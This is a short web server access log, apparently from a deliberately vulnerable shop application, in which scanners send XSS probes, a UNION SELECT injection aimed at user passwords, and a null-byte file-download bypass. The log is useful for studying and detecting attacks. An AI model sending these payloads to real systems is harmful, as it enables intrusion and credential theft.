172.16.0.5 - - [29/Nov/2025:19:40:59 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:41:00 +0000] "GET /socket.io/?EIO=3&transport=polling HTTP/1.1" 400 62 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
10.0.0.2 - - [29/Nov/2025:19:41:00 +0000] "GET /rest/products/search?q=apple HTTP/1.1" 200 631 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
203.55.11.22 - - [29/Nov/2025:19:41:00 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.0.2 - - [29/Nov/2025:19:41:01 +0000] "GET / HTTP/1.1" 200 9020 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
192.168.1.5 - - [29/Nov/2025:19:41:01 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:41:01 +0000] "GET /api/Challenges HTTP/1.1" 200 8640 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
172.16.0.5 - - [29/Nov/2025:19:41:02 +0000] "GET /assets/public/images/products/juice.jpg HTTP/1.1" 200 9027 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:41:02 +0000] "GET /rest/products/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1" 200 30 "python-requests/2.26.0"
203.55.11.22 - - [29/Nov/2025:19:41:02 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "python-requests/2.26.0"
66.77.88.99 - - [29/Nov/2025:19:41:03 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "Nikto/2.1.0"
10.0.0.2 - - [29/Nov/2025:19:41:03 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
66.77.88.99 - - [29/Nov/2025:19:41:03 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:41:04 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "Nikto/2.1.0"
203.55.11.22 - - [29/Nov/2025:19:41:04 +0000] "GET /ftp/package.json.bak%2500.md HTTP/1.1" 200 4291 "python-requests/2.26.0"
203.55.11.22 - - [29/Nov/2025:19:41:04 +0000] "GET /api/Feedbacks?comment=%3Cscript%3Ealert('Hacked')%3C/script%3E&rating=5 HTTP/1.1" 200 30 "python-requests/2.26.0"
203.55.11.22 - - [29/Nov/2025:19:41:04 +0000] "GET /rest/products/search?q='%20UNION%20SELECT%20username,%20password%20FROM%20users%20-- HTTP/1.1" 500 994 "python-requests/2.26.0"
192.168.1.5 - - [29/Nov/2025:19:41:05 +0000] "GET / HTTP/1.1" 200 9027 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
